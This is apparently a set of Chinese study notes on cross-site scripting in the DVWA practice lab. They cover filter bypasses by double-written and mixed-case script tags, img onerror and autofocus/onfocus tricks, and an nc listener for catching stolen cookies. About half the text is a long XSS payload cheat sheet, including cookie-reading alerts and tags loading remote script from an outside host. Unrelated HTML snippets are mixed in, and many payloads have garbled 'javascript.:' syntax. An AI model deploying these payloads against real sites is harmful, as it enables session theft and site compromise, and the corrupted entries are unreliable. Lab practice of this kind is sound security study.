http://192.168.56.1/DVWA/vulnerabilities/xss_d/?default=English<script>alert(%27提交成功！%27);location.href=%27https://www.jianshu.com/p/757626cec742%27;"%20response.end</script>

杨辉三角：
<script language="JavaScript">var write=function() { for(var i=0;i<arguments.length;i++) {document.write(" "+arguments[i]);} }var fun=function(n) {var k; for(var i=1;i<=n;i++) {k=1;for(var j=1;j<i;j++) {write(k);k=k*(i-j)/j; } write("1<br/>"); };fun(5);</script>

关于autofocus的属性
：autofocus 属性是一个布尔属性。
autofocus 属性规定当页面加载时 <input> 元素应该自动获得焦点。
焦点的意思就是被选中，和文本框相似，<button type="button" autofocus="autofocus">点击这里</button>当页面加载完成之后，这个按钮会被选中
autofocus 属性是一个布尔属性。
autofocus 属性规定当页面加载时 <input> 元素应该自动获得焦点。
1 2 3 4
<!-- These all work! --> <input autofocus="autofocus" /> <button autofocus="autofocus">Hi!</button> <textarea autofocus="autofocus"></textarea>
当有了autofocus属性，这些 INPUT, TEXTAREA, 或 BUTTON元素都能在页面加载是被选中。但如果使用纯显示元素，例如H1标记，autofocus属性并不好用。
这个属性在某些情况下非常有用。例如谷歌的首页，人们99%的时间都是用它来搜索，所以页面一旦加载，光标必然定位在输入框里。以前需要使用JavaScript才能完成，现在完全不需要了，html自己就能完成。


在html中 onfocus事件表示   事件在对象获得焦点时发生。

https://www.runoob.com/try/try.php?filename=tryjsref_onfocus
1.反射型XSS漏洞

在medium中 对代码进行了过滤，可以直接用双写 绕过！
输入<sc<script>ript>alert(/xss/)</script>，成功弹框：
相应的 XSS 链接：
http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#
其中使用url翻译：http://tool.chinaz.com/tools/urlencode.aspx

也可以通过大小写混淆写通过：
输入<ScRipt>alert(/xss/)</script>，<ScRipt>alert(/网安2019/)</script>成功弹框：网安2019国庆70周年网络安全保障行动
<ScRipt>alert(/网安2019国庆70周年网络安全保障行动/)</script>
<ScRipt>alert(/wangan2019guoqing?70zhounianwangluoanquanbaozhangxingdongL?/)</script>
相应的 XSS 链接（转码为url）：http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#


但是在high中

过滤了很多代码，使得<script> 注入XSS代码无法使用。只能通过 其他方法
具体见上文

<input onfocus="alert('xss');" autofocus>


2.存储型XSS漏洞
对输入并没有做 XSS 方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型 XSS 漏洞




medium：

所以可以直接使用双写，大小写混写等直接绕过！
很垃圾：
双写绕过
直接修改前端代码改 name 参数为 
<sc<script>ript>alert(/xss/)</script> ,成功弹框
大小写混淆绕过
直接修改前端代码改 name 参数为
 <Script>alert(/xss/)</script> ,成功弹框




high的代码很有效的过滤了所有  script的标签，但是，他旺旺没想到，魔高一尺道高一丈，你大爷永远是你大爷：

可以看到，这里使用正则表达式过滤了 <script> 标签，但是却忽略了 img、iframe 等其它危险的标签，因此 name 参数依旧存在存储型 XSS。
漏洞利用
直接修改前端代码改 name 参数为 <img src=1 onerror=alert(网安2019)> ,成功弹框

3.DOM型xss漏洞
DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。


当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。
利用创建元素createElement()：
以DVWA反射型XSS为例，先在Kali监听1234端口：
nc -nvlp 1234

意在截取1234端口的cookie值。


XSS注入常用语句（整理）
```html
<script>alert('hello，gaga!');</script> //经典语句，哈哈！

>"'><img src="javascript.:alert('XSS')">

>"'><script>alert('XSS')</script>

<table background='javascript.:alert(([code])'></table>

<object type=text/html data='javascript.:alert(([code]);'></object>

"+alert('XSS')+"

'><script>alert(document.cookie)</script>

='><script>alert(document.cookie)</script>

<script>alert(document.cookie)</script>

<script>alert(vulnerable)</script>

<s&#99;ript>alert('XSS')</script>

<img src="javas&#99;ript:alert('XSS')">

%0a%0a<script>alert(\"Vulnerable\")</script>.jsp

%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e

%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e

%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html

<script>alert('Vulnerable')</script>

a.jsp/<script>alert('Vulnerable')</script>

"><script>alert('Vulnerable')</script>

<IMG SRC="javascript.:alert('XSS');">

<IMG src="/javascript.:alert"('XSS')>

<IMG src="/JaVaScRiPt.:alert"('XSS')>

<IMG src="/JaVaScRiPt.:alert"(&quot;XSS&quot;)>

<IMG SRC="jav&#x09;ascript.:alert('XSS');">

<IMG SRC="jav&#x0A;ascript.:alert('XSS');">

<IMG SRC="jav&#x0D;ascript.:alert('XSS');">

"<IMG src="/java"\0script.:alert(\"XSS\")>";'>out

<IMG SRC=" javascript.:alert('XSS');">

<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>

<BODY BACKGROUND="javascript.:alert('XSS')">

<BODY ONLOAD=alert('XSS')>

<IMG DYNSRC="javascript.:alert('XSS')">

<IMG LOWSRC="javascript.:alert('XSS')">

<BGSOUND SRC="javascript.:alert('XSS');">

<br size="&{alert('XSS')}">

<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>

<LINK REL="stylesheet"HREF="javascript.:alert('XSS');">

<IMG SRC='vbscript.:msgbox("XSS")'>

<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert('XSS');">

<IFRAME. src="/javascript.:alert"('XSS')></IFRAME>

<FRAMESET><FRAME. src="/javascript.:alert"('XSS')></FRAME></FRAMESET>

<TABLE BACKGROUND="javascript.:alert('XSS')">

<DIV STYLE="background-image: url(javascript.:alert('XSS'))">

<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html&#39;);">

<DIV STYLE="width: expression(alert('XSS'));">

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<IMG STYLE='xss:expre\ssion(alert("XSS"))'>

<STYLE. TYPE="text/javascript">alert('XSS');</STYLE>

<STYLE. TYPE="text/css">.XSS{background-image:url("javascript.:alert('XSS')");}</STYLE><A CLASS=XSS></A>

<STYLE. type="text/css">BODY{background:url("javascript.:alert('XSS')")}</STYLE>

<BASE HREF="javascript.:alert('XSS');//">

getURL("javascript.:alert('XSS')")

a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);

<XML SRC="javascript.:alert('XSS');">

"> <BODY NLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"

<SCRIPT. SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>

<IMG SRC="javascript.:alert('XSS')"

<SCRIPT. a=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT.=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT. a=">"''SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT."a='>'"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://xss.ha.ckers.org/a.js"></SCRIPT>

<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>

```



